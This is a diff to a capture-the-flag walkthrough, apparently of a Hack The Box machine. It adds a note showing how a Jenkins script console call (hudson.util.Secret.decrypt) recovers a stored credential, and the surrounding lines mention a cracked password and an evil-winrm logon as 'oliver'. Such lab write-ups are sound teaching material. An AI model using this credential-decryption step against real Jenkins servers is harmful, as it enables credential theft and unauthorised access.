@@ -252,6 +252,12 @@ Cool, now that we have these three files we can use https://github.com/gquere/pw
 c1cdfun_d2434
 ```
 
+Note: If we had access to the `/script` console, we could have decoded the password hash there with:
+
+```
+println(hudson.util.Secret.decrypt("{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}"))
+```
+
 With this decrypted password hash we can use evil-winrm to logon as oliver, and grab the user.txt flag:
 
 ```
